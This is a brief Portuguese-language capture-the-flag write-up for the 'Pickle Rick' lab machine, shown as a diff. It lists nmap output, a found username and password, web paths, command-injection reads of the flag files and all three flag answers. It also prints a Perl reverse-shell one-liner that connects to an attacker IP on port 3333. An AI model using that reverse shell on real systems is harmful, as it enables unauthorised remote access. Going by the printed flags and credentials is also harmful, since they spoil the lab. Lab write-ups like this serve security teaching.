@@ -1,0 +1,39 @@
+Maquina Pickle Rick
+
+Enumeracao
+
+  nmap -sV -vvv 10.10.133.155
+
+      PORT   STATE SERVICE REASON  VERSION
+      22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+      80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Inspecao de pagina
+  Found inside page
+  Username: R1ckRul3s
+
+Directory Listing:
+
+  http://10.10.133.155/assets/
+  http://10.10.133.155/robots.txt > Wubbalubbadubdub (Senha do portal)
+  http://10.10.133.155/portal.php
+  http://10.10.133.155/clue.txt
+
+  less "/home/rick/second ingredients"
+    <!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== --> (Base64 > rabbit hole)
+
+
+
+Command Injection
+less Sup3rS3cretPickl3Ingred.txt
+  Flag: mr. meeseek hair (Ingrediente 1)
+
+less "/home/rick/second ingredients"
+  Flag: 1 jerry tear (Ingrediente 2)
+
+nc -nlvp 3333 ( Maquina Windows)
+  Flag: perl -e 'use Socket;$i="10.9.131.105";$p=3333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
+
+sudo less /root/3rd.txt 
+  Flag: fleeb juice (Ingrediente 3)
